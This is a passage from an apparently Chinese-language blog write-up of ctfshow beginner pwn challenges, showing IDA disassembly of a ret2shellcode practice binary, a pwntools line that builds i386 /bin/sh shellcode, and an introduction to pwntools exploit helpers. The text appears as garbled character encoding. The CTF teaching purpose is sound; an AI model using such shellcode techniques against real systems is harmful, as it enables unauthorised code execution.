<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># ä¸€æ­¥å®Œæˆâ€œæ±‡ç¼–æ¨¡æ¿â†’æœºå™¨ç â€è½¬æ¢ï¼Œç±»ä¼¼Cè¯­è¨€çš„ç¼–è¯‘å™¨åŠŸèƒ½ï¼Œè½¬æ¢æˆæœºå™¨è¯­è¨€ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>IDAï¼šå¯ä»¥çœ‹åˆ°è¿™é¢˜ä¼¼ä¹å’Œret2shellcodeæœ‰å…³</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/63.png"
	width="1045"
	height="415"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/63_hu_8320440ce8e9ad20.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/63_hu_f063bc9aa051b388.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="604px"
	
></p>
<p>çœ‹é¢˜ç›®æç¤ºï¼Œè¿›å…¥æ–°å¤§é™†äº†&hellip;ç”¨pwntoolsäº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/64.png"
	width="710"
	height="295"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/64_hu_2df4fc228f333ed2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/64_hu_ff2fcff08e5e36b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="240"
		data-flex-basis="577px"
	
></p>
<p>è¿™é‡Œæœ‰æç¤ºï¼Œå¯ä»¥çœ‹ä¸€ä¸‹<a class="link" href="https://expl0rer.top/p/pwn-1/#nx"  target="_blank" rel="noopener"
    >PWN-1-NXä¿æŠ¤</a>ï¼Œæœ‰å•¥å¯å‘ï¼Ÿ</p>
<p>åœ¨IDAåˆ†æå¯çŸ¥ï¼Œctfshowå‡½æ•°æ— æ³•è·Ÿè¿›æºä»£ç ï¼Œåªèƒ½çœ‹å®ƒçš„ä¼ªä»£ç å»åˆ†æäº†ï¼ˆæ¯”è¾ƒé•¿ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132â†“p</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>å¦‚æœä¹‹å‰æ˜¯æ‰“é€†å‘æˆ–è€…å¼ºè¡Œå…¥é—¨PWNçš„è¯ï¼Œæœ€åç‰¢çš„æˆ‘ç›¸ä¿¡åº”è¯¥æ˜¯ç”¨IDAå§ï¼Œé™¤äº†æ‰¾æ˜æ–‡å­—ç¬¦ä¸²flagå¤–ï¼Œä½ å­¦äº†æ±‡ç¼–è¯­è¨€ä½ ä¹Ÿçœ‹ä¸æ‡‚è¿™æ˜¯å•¥æ„æ€ï¼Œæ„Ÿè§‰ä¸€å°ä¸²æºä»£ç è½¬æ¢æˆæ±‡ç¼–è¯­è¨€éå¸¸é•¿ã€æ¯ç‡¥ï¼Œå…¶å®UPä¸»ä¹Ÿæ·±æœ‰ä½“ä¼šï¼Œåœ¨ç³»ç»Ÿæ€§å…¥é—¨åï¼Œä¹Ÿåˆæ­¥çŸ¥é“IDAæ˜¯æ€ä¹ˆç”¨çš„ï¼Œè¿™é‡Œæˆ‘æŠŠä¸‹åˆ’çº¿â€œ===== S U B R O U T I N E =====â€ä¹Ÿå¤åˆ¶è¿›æ¥äº†ï¼ŒæŒ‰æˆ‘ç†è§£è¿™æ˜¯å‡½æ•°åˆ†ç•Œï¼Œåˆ†éš”çº¿ä¸Šæ–¹æ˜¯å‰ä¸€ä¸ªå‡½æ•°çš„ç»“å°¾ï¼ˆé€šå¸¸ä»¥<code>retn</code>æŒ‡ä»¤ç»“æŸï¼Œä»£è¡¨å‡½æ•°è¿”å›ï¼‰è¿‡äº†è¿™æ¡çº¿ï¼Œè¯´æ˜æ±‡ç¼–è¯­è¨€åœ¨æè¿°çš„å°±æ˜¯å¦å¤–ä¸€ä¸ªå‡½æ•°äº†ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸Šä¸‹åˆ†ç•Œçº¿æ˜¯ä»£è¡¨å›Šæ‹¬ç€ä¸€ä¸ªå‡½æ•°ï¼Œä¾‹å¦‚è¿™ctfshowå‡½æ•°ã€‚</p>
<p>å¦å¤–æˆ‘æƒ³è¯´çš„æ˜¯æ±‡ç¼–è¯­è¨€è¿™ä¹ˆé•¿æ˜¯æœ‰é“ç†çš„ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ç§â€œå•°å—¦â€ï¼Œå®ƒèƒ½åœ¨æ¯ä¸€æ®µä»£ç è¿è¡Œåä¸æ–­å‘ä½ æ±‡æŠ¥åœ°å€å˜åŒ–ï¼Œè¿™ç§ â€œå•°å—¦â€ æœ¬è´¨ä¸Šæ˜¯<strong>å¯¹è®¡ç®—æœºåº•å±‚æ“ä½œçš„ç›´æ¥æ˜ å°„</strong>ï¼Œè¿™ç§ç‰¹æ€§ç¡®å®è®©å®ƒåœ¨è·Ÿè¸ªç¨‹åºè¿è¡Œç»†èŠ‚ã€åˆ†æé€»è¾‘å’Œæ’æŸ¥é—®é¢˜æ—¶å…·æœ‰ç‹¬ç‰¹ä¼˜åŠ¿ã€‚</p>
</blockquote>
<p>ä»è¿™é‡Œå¼€å§‹å°±è¦ç”¨pwntoolsäº†ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹ï¼š</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>from pwn import *</code> æ˜¯åœ¨ Python ä¸­ä½¿ç”¨ <code>pwntools</code> åº“çš„å¸¸è§å¯¼å…¥æ–¹å¼ ã€‚<code>pwntools</code> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç”¨äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼ˆbinary exploitationï¼‰çš„ Python åº“ï¼Œåœ¨ CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ› ï¼‰ç«èµ›ã€å®‰å…¨ç ”ç©¶ä»¥åŠæ¼æ´åˆ†æç­‰é¢†åŸŸå¹¿æ³›åº”ç”¨ï¼Œä»¥ä¸‹æ˜¯å…¶å…·ä½“ä½œç”¨ï¼š</p>
<h4 id="ä¸ç›®æ ‡ç¨‹åºäº¤äº’">ä¸ç›®æ ‡ç¨‹åºäº¤äº’
</h4><ul>
<li><strong>æœ¬åœ°è¿›ç¨‹äº¤äº’</strong>ï¼š<code>pwntools</code> èƒ½è½»æ¾åˆ›å»ºæœ¬åœ°è¿›ç¨‹ï¼Œæ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥ã€è·å–ç¨‹åºè¾“å‡ºã€‚ä¾‹å¦‚ï¼Œ<code>p = process('./vulnerable_program')</code> å¯ä»¥å¯åŠ¨æœ¬åœ°çš„å¯æ‰§è¡Œæ–‡ä»¶ <code>vulnerable_program</code>ï¼Œç„¶åé€šè¿‡ <code>p.sendline('input data')</code> å‘ç¨‹åºå‘é€æ•°æ®ï¼Œç”¨ <code>p.recvuntil('prompt')</code> æ¥æ”¶ç¨‹åºè¾“å‡ºç›´åˆ°é‡åˆ°ç‰¹å®šå­—ç¬¦ä¸²ã€‚</li>
<li><strong>è¿œç¨‹æœåŠ¡å™¨äº¤äº’</strong>ï¼šåœ¨é¢å¯¹è¿œç¨‹å­˜åœ¨æ¼æ´çš„æœåŠ¡æ—¶ï¼Œ<code>pwntools</code> æä¾›äº†ä¾¿æ·çš„æ–¹æ³•ã€‚æ¯”å¦‚ <code>r = remote('target.com', 8080)</code> å¯ä»¥è¿æ¥åˆ° <code>target.com</code> æœåŠ¡å™¨çš„ 8080 ç«¯å£ï¼Œåç»­åŒæ ·èƒ½å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ–¹ä¾¿å¯¹è¿œç¨‹æœåŠ¡è¿›è¡Œæµ‹è¯•å’Œæ¼æ´åˆ©ç”¨ã€‚</li>
</ul>
<h4 id="äºŒè¿›åˆ¶æ•°æ®å¤„ç†">äºŒè¿›åˆ¶æ•°æ®å¤„ç†
</h4><ul>
<li><strong>æ•°æ®æ‰“åŒ…å’Œè§£åŒ…</strong>ï¼šåœ¨äºŒè¿›åˆ¶ç¨‹åºä¸­ï¼Œç»å¸¸éœ€è¦å¤„ç†ä¸åŒå­—èŠ‚åºï¼ˆå¤§ç«¯åºã€å°ç«¯åºï¼‰çš„æ•°æ®ã€‚<code>pwntools</code> æä¾›äº† <code>pack</code> å’Œ <code>unpack</code> å‡½æ•°ï¼Œæ¯”å¦‚ <code>p32(0x12345678)</code> å¯ä»¥å°†æ•´æ•° <code>0x12345678</code> æŒ‰ç…§å°ç«¯åºæ‰“åŒ…æˆ 4 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®ï¼›<code>u32(data)</code> åˆ™å¯ä»¥å°† 4 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§å°ç«¯åºè§£åŒ…ä¸ºæ•´æ•°ã€‚</li>
<li><strong>æ•°æ®è½¬æ¢</strong>ï¼šå®ƒè¿˜æ”¯æŒå„ç§æ•°æ®æ ¼å¼ä¹‹é—´çš„è½¬æ¢ï¼Œå¦‚å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²ï¼Œæˆ–è€…è¿›è¡Œåå…­è¿›åˆ¶ä¸äºŒè¿›åˆ¶æ•°æ®ä¹‹é—´çš„è½¬æ¢ç­‰ã€‚</li>
</ul>
<h4 id="è¾…åŠ©æ¼æ´åˆ©ç”¨">è¾…åŠ©æ¼æ´åˆ©ç”¨
</h4><ul>
<li><strong>ç”Ÿæˆ Payload</strong>ï¼šå¯¹äºç¼“å†²åŒºæº¢å‡ºç­‰æ¼æ´ï¼Œéœ€è¦ç²¾å¿ƒæ„é€  Payloadï¼ˆæ”»å‡»è½½è·ï¼‰ã€‚<code>pwntools</code> æä¾›äº†ç”Ÿæˆå¡«å……æ•°æ®ã€æ„é€  ROPï¼ˆReturn-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹ ï¼‰é“¾ç­‰åŠŸèƒ½ã€‚æ¯”å¦‚ <code>cyclic(100)</code> å¯ä»¥ç”Ÿæˆä¸€ä¸ª 100 å­—èŠ‚çš„å¾ªç¯æ¨¡å¼å­—ç¬¦ä¸²ï¼Œç”¨äºç¡®å®šç¼“å†²åŒºæº¢å‡ºçš„åç§»é‡ï¼›é€šè¿‡ <code>ROP</code> æ¨¡å—å¯ä»¥æ–¹ä¾¿åœ°æ„å»º ROP é“¾æ¥ç»•è¿‡ä¸€äº›å®‰å…¨æœºåˆ¶ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚</li>
<li><strong>ç¬¦å·è§£æ</strong>ï¼šåœ¨åˆ†æäºŒè¿›åˆ¶ç¨‹åºæ—¶ï¼Œæœ‰æ—¶éœ€è¦è§£æç¨‹åºä¸­çš„å‡½æ•°åœ°å€ã€å˜é‡åœ°å€ç­‰ã€‚<code>pwntools</code> å¯ä»¥ä¸ <code>ELF</code>ï¼ˆExecutable and Linkable Formatï¼Œå¯æ‰§è¡Œä¸å¯é“¾æ¥æ ¼å¼ï¼Œå¸¸ç”¨äº Linux ç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ç­‰ ï¼‰æ–‡ä»¶äº¤äº’ï¼Œè·å–è¿™äº›ç¬¦å·ä¿¡æ¯ï¼Œä¾‹å¦‚ <code>elf = ELF('./target_binary')</code> å¯ä»¥åŠ è½½ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ <code>elf.symbols['main']</code> è·å– <code>main</code> å‡½æ•°çš„åœ°å€ã€‚</li>
</ul>
<h4 id="å¯†ç å­¦ç›¸å…³è¾…åŠ©">å¯†ç å­¦ç›¸å…³è¾…åŠ©
</h4><p>åœ¨ CTF ä¸­ï¼Œæœ‰æ—¶ä¼šæ¶‰åŠå¯†ç å­¦é¢˜ç›®ï¼Œ<code>pwntools</code> ä¹Ÿæä¾›äº†ä¸€äº›åŸºç¡€çš„å¯†ç å­¦è¾…åŠ©åŠŸèƒ½ï¼Œæ¯”å¦‚å¸¸è§åŠ å¯†ç®—æ³•çš„ç®€å•å®ç°ã€ç¼–ç è§£ç ç­‰ã€‚</p>
<h4 id="å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ">å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ
</h4><p><code>pwntools</code> ä¸€å®šç¨‹åº¦ä¸Šæ”¯æŒå¤šçº¿ç¨‹å’Œå¼‚æ­¥æ“ä½œï¼Œè¿™åœ¨åŒæ—¶ä¸å¤šä¸ªç›®æ ‡ç¨‹åºäº¤äº’ï¼Œæˆ–è€…éœ€è¦åœ¨ç­‰å¾…ç¨‹åºè¾“å‡ºçš„åŒæ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡æ—¶éå¸¸æœ‰ç”¨ã€‚</p>
</blockquote></blockquote>
<p>æ‰€ä»¥ä¸ºå•¥è¦å­¦<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
    >Python</a>ï¼Œå½“ç„¶èƒ½ç”¨<a class="link" href="https://www.doubao.com/chat/?from_logout=1"  target="_blank" rel="noopener"
    >è±†åŒ…</a>ã€<a class="link" href="https://www.deepseek.com/"  target="_blank" rel="noopener"
    >DeepSeek</a>ä¹‹ç±»çš„AIå¸®ä½ å†™ä»£ç expï¼Œä½†ä½ å¾—å…ˆäº†è§£<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
    >Python</a>å†è®©å®ƒå†™æ‰å¯¹çš„ï¼Œæœ‰æ—¶ä¼šå‡ºé”™ï¼Œä½ å¾—æœ‰åˆ¤æ–­åŠ›ã€‚</p>
<blockquote>
<p>è¿™é‡Œæ¨èä½¿ç”¨Pycharmã€Visual Studio Codeï¼›æˆ–è€…ä½ å¯ä»¥åœ¨Kaliä¸Šç”¨ç»ˆç«¯æ¥è¿è¡Œï¼Œè¿™æ ·ä½ åœ¨Kaliç”¨ncè¿æ¥é¶æœºæ—¶åœ¨åŒä¸€ç³»ç»Ÿè¿è¡Œäº¤äº’æ¯”è¾ƒæ–¹ä¾¿ï¼Œå½“ç„¶Pycharmã€Visual Studio Codeä¹Ÿæœ‰ç»ˆç«¯åŠŸèƒ½ï¼Œåªä¸è¿‡è¦é…PWNç¯å¢ƒç¨å¾®éº»çƒ¦è€Œå·²ï¼Œçœ‹ä½ ä¹ ä¸ä¹ æƒ¯ç”¨Linuxç³»ç»Ÿå§ã€‚</p>
</blockquote>
<h4 id="é¢˜ç›®åç»­">é¢˜ç›®åç»­ï¼š
</h4><p>è®²å¾—æ¯”è¾ƒå•°å—¦ï¼Œè¿™é‡Œå¼€å§‹åˆ†æè¿™æ®µæ±‡ç¼–ä»£ç ï¼ˆé‡æ–°ç²˜è´´äº†ä¸€éï¼Œå’Œä¸Šé¢ä¸€æ ·ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132â†“p</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
